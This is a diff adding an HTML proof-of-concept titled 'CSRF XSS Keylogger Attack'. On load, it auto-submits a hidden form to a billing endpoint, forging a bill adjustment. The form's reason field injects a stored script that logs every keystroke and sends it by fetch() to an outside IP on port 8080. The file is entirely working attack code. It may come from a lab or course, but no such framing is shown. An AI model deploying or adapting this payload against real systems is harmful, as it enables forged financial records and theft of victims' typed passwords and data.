@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF XSS Keylogger Attack</title>
+</head>
+<body onload="document.forms[0].submit()">
+    <form action="https://140.245.27.133/bill-adjustments" method="POST">
+        <input type="hidden" name="bill_id" value="800">
+        <input type="hidden" name="officer_name" value="Hacker">
+        <input type="hidden" name="officer_designation" value="Cyber Criminal">
+        <input type="hidden" name="original_bill_amount" value="6000">
+        <input type="hidden" name="adjustment_amount" value="1200">
+        <input type="hidden" name="adjustment_reason" value='<script>document.addEventListener("keydown", function(e) {fetch("http://140.245.27.133:8080/?key=" + encodeURIComponent(e.key));});</script>'>
+    </form>
+</body>
+</html>
